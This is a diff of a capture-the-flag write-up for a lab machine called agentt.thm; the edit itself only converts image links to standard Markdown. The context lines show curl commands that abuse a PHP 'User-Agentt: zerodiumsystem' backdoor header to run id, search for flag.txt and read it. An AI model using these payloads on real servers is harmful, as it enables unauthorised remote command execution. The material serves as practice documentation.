@@ -32,7 +32,7 @@ Gobuster
 		blank.html
 	
 	
-![[BlankPage.png]]
+![Blank Page](screenshots/BlankPage.png)
 
 ---------------------------------------
 ##### 4. **Hypothesis**
@@ -46,7 +46,7 @@ I'll testing this before using any other external mechanism(exploit)
 
 	**curl -H "User-Agentt: zerodiumsystem('id');" http://agentt.thm**
 	
-![[validation.png]]
+![RCE Validation](screenshots/validation.png)
 
 Remote Command Execution was successfully confirmed through manual payload injection in the HTTP header.
 ##### 6. Exploitation
@@ -55,6 +55,6 @@ curl -H "User-Agentt: zerodiumsystem('find / -name flag.txt 2>/dev/null');" http
 
 curl -H "User-Agentt: zerodiumsystem('cat /flag.txt');" http://agentt.thm | head
 
-![[flag.png]]
+![flag](screenshots/flag.png)
 
 
